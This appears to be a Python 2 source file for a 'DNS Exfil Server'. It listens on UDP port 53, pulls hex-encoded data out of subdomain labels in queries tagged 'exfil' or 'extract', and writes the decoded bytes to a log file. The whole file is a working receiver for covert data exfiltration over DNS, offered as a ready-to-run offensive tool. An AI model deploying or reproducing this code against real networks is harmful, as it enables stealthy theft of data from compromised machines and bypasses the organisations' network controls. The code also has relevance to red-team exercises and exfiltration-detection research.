'''
Created on 21 Feb 2018

@author: gavin
'''
__version__='$Revision: 0.1 $'[11:-2]
NAME = """  _____  _   _  _____   ________   ________ _____ _         _____ ______ _______      ________ _____  
 |  __ \| \ | |/ ____| |  ____\ \ / /  ____|_   _| |       / ____|  ____|  __ \ \    / /  ____|  __ \ 
 | |  | |  \| | (___   | |__   \ V /| |__    | | | |      | (___ | |__  | |__) \ \  / /| |__  | |__) |
 | |  | | . ` |\___ \  |  __|   > < |  __|   | | | |       \___ \|  __| |  _  / \ \/ / |  __| |  _  / 
 | |__| | |\  |____) | | |____ / . \| |     _| |_| |____   ____) | |____| | \ \  \  /  | |____| | \ \ 
 |_____/|_| \_|_____/  |______/_/ \_\_|    |_____|______| |_____/|______|_|  \_\  \/   |______|_|  \_\

"""

from SocketServer import UDPServer
from SocketServer import ThreadingMixIn
from SocketServer import BaseRequestHandler
from dnslib import DNSRecord, DNSRecord, DNSHeader, DNSQuestion, RR, A
import datetime
import time
import socket
import threading
import re
import binascii
import sys

class DNSExfilHandler(BaseRequestHandler):
    def __init__(self, *args):
        BaseRequestHandler.__init__(self, *args)
    
    def setup(self):
        pass
       
    def handle(self):
        try:
            socket = self.request[1]
            data = self.request[0].rstrip()
            
            if len(data) > 0:
                try:
                    dnsrequest = DNSRecord.parse(data)
                    header = dnsrequest.header
                    question = dnsrequest.get_q()
                    questionname = question.get_qname()
                    
                    domain = str(questionname)
                    data, domain = domain.split('.', 1)
                    if 'ns1' in data or 'ns2' in data:
                        pass
                    elif data.lower() == 'extract' or data.lower() == 'exfil':
                        hexdata = domain.split('.')[0]
                        print '[+] Extracting data "%s"' % hexdata
                        if re.match('[0-9a-fA-F]{2}', hexdata):    #take the first part of the domain
                            self.write_to_file(hexdata)
                    else:
                        print '[+] Got DNS request {}.{}'.format(data,domain)
                        
                    resp = DNSRecord(
                            DNSHeader(qr=1, aa=1, ra=1, id=header.id),
                            q = question,
                            a = RR(questionname, rdata=A(self.get_resolved_ip()))
                        )
                    socket.sendto(resp.pack(), self.client_address)
                except Exception, e:
                    raise
        except Exception as e:
            if 'Connection reset by peer' in e.args:
                print "[-] Client closed the connection"
            else:
                raise
            
    def finish(self):
        pass
        
    def handle_error(self, request, client_address):
        print "[-] %s:%i Connection error" % (self.client_address[0], self.client_address[1])
        self.request.close()
        
    def handle_timeout(self):
        pass
            
    def get_resolved_ip(self):
        if self.server.RESOLVEDIP:
            return self.server.RESOLVEDIP   
        return self.server.socket.getsockname()[0]
    
    def write_to_file(self, hexdata):
        try:
            raw = binascii.a2b_hex(hexdata)
            filesize = self.server.FILE.tell() + len(raw)
            print "[+] Writing %i bytes to file" % filesize
            sys.stdout.write("\033[F")
            self.server.FILE.write(raw)
            self.server.FILE.flush()
        except Exception, e:
            print "[-] Invalid data received - %s" % e
        
class ThreadedUDPServer(ThreadingMixIn, UDPServer):
    daemon_threads = True
    allow_reuse_address = True
    max_packet_size = 2048

if __name__ == '__main__':
    import sys
    import os
    from optparse import OptionParser
    
    usage = '%prog [OPTIONS]'
    parser = OptionParser(usage=usage, version=__version__)
    parser.add_option('-r', '--resolve-to', dest='RESOLVE', type="string",
                      help='overwrite the resolved IP for an A record. Default is the server IP for incoming connections')
    parser.add_option('-s', '--save', dest='SAVE', type="string", default="./data.log",
                      help='location to save exfiltrated data to')
    parser.add_option('-i', '--ip', dest='IP', type="string", default='0.0.0.0',
                      help='IP address to run on')
    (opts, args) = parser.parse_args()
    
    print NAME
    address = (opts.IP, 53)
    print "[+] Starting DNS exfiltration tool on %s:%i" % address
    
    try:
        f = open(opts.SAVE, "w")
    except:
        print "[-] Failed to write to log"
        sys.exit()
        
    print "[+] Saving exfil data to %s" % opts.SAVE
        
    try:
        server = ThreadedUDPServer(address, DNSExfilHandler)
        server.RESOLVEDIP = opts.RESOLVE
        server.FILE = f
        thread = threading.Thread(target=server.serve_forever())
        thread.start()
    except KeyboardInterrupt:
        f.close()
        print "[+] ^C received, shutting down server"
